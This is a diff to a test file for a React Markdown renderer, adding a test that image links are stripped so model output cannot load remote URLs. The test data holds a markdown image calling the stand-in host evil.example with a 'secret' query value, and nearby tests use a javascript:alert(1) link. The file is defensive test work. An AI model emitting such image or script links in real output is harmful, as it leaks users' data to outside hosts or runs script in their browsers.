@@ -19,6 +19,15 @@ describe("Markdown", () => {
     expect(container.querySelector("[onerror]")).toBeNull();
   });
 
+  it("drops images so model output cannot load remote URLs", () => {
+    const { container } = render(
+      <Markdown
+        text={"![x](https://evil.example/?d=secret)\n\n![y][ref]\n\n[ref]: https://evil.example/r"}
+      />,
+    );
+    expect(container.querySelector("img")).toBeNull();
+  });
+
   it("drops javascript: link targets", () => {
     render(<Markdown text="[click](javascript:alert(1))" />);
     expect(screen.getByText("click").getAttribute("href")).toBeNull();
